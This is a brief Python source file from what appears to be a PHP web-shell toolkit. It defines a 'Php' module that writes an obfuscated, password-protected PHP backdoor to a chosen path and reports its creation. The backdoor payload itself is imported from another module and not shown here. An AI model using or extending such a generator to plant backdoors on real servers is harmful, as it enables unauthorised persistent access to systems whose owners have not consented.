'''
Created on 22/ago/2011

@author: norby
'''

from core.moduleprobe import ModuleProbe
from core.moduleexception import ModuleException
from core.backdoor import Backdoor

class Php(ModuleProbe):
    """Generate obfuscated PHP backdoor"""

    def _set_args(self):
        self.argparser.add_argument('lpath', help='Path of generated backdoor')
        self.argparser.add_argument('pass', help='Password')

    def _probe(self):
        
        try:
            file( self.args['lpath'], 'wt' ).write( Backdoor(self.args['pass']).backdoor )
        except Exception, e:
            raise ModuleException(self.name,str(e))
        else:
            self.mprint("Backdoor file '%s' created with password '%s'" % (self.args['lpath'], self.args['pass']))
            
            
                    
        